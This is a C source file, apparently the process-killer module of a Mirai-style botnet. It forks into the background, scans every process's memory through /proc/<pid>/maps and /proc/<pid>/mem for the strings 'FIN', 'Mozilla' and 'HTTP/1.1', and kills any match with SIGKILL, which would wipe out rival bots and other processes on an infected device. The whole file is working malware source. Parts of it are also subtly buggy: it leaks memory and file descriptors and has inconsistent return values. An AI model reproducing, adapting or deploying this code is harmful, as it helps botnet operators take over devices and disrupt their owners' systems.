#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

struct {
    char *pattern;
    size_t pattern_len;
} patterns[] = {
    {"FIN", 3},
    {"Mozilla", 7},
    {"HTTP/1.1", 8},
};

#define TOTAL_PATTERNS sizeof(patterns)/sizeof(patterns[0])

static BOOL KillerMatchPattern(const char *bytes, size_t bytes_len, const char *pattern, size_t pattern_len) {
    for(int i = 0; i < bytes_len; i++) {
        if(!util_memcmp(bytes + i, pattern, pattern_len))
            return TRUE;
    }

    return FALSE;
}

static BOOL KillerMatchAllPatterns(const char *bytes, size_t bytes_len) {
    for(int i = 0; i < TOTAL_PATTERNS; i++) {
        if(KillerMatchPattern(bytes, bytes_len, patterns[i].pattern, patterns[i].pattern_len))
            return TRUE;
    }

    return FALSE;
}

static BOOL KillerHasBadMemory(int fd, char *pid, off_t start, off_t end) {
    size_t bytes_to_read = end - start;
    char *bytes = calloc(1, bytes_to_read);

    lseek(fd, start, SEEK_SET);

    if(read(fd, bytes, bytes_to_read) != bytes_to_read)
        return FALSE;
    
    return KillerMatchAllPatterns(bytes, bytes_to_read);
}

static BOOL KillerGetMemoryOffset(char *pid) {
    char maps_path[PATH_MAX] = {0};

    util_strcpy(maps_path, "/proc/");
    util_strcat(maps_path, pid);
    util_strcat(maps_path, "/maps");

    int mfd;
    if((mfd = open(maps_path, O_RDONLY)) == -1)
        return -1;

    char mem_path[PATH_MAX] = {0};

    util_strcpy(mem_path, "/proc/");
    util_strcat(mem_path, pid);
    util_strcat(mem_path, "/mem");

    int fd;
    if((fd = open(mem_path, O_RDONLY)) == -1)
        return -1;
    
    char rdbuf[2048] = {0};

    while(util_fdgets(rdbuf, sizeof(rdbuf), mfd)) {
        int start_mem_end = util_strlen_until(rdbuf, '-');

        off_t start = util_strtoul(rdbuf, NULL, 16);
        off_t end = util_strtoul(rdbuf + (start_mem_end + 1), NULL, 16);

        if(KillerHasBadMemory(fd, pid, start, end))
            return TRUE;
    }
}

void Killer() {
    if(fork() > 0)
        return;

    DIR *proc;
    if((proc = opendir("/proc/")) == NULL)
        return;
    
    struct dirent *files;

    while(1) {
        while((files = readdir(proc))) {
            if(*files->d_name > '9' || *files->d_name < '0')
                continue;
            
            if(KillerGetMemoryOffset(files->d_name))
                kill(atoi(files->d_name), 9);
        }

        rewinddir(proc);
        usleep(100000);
    }
}
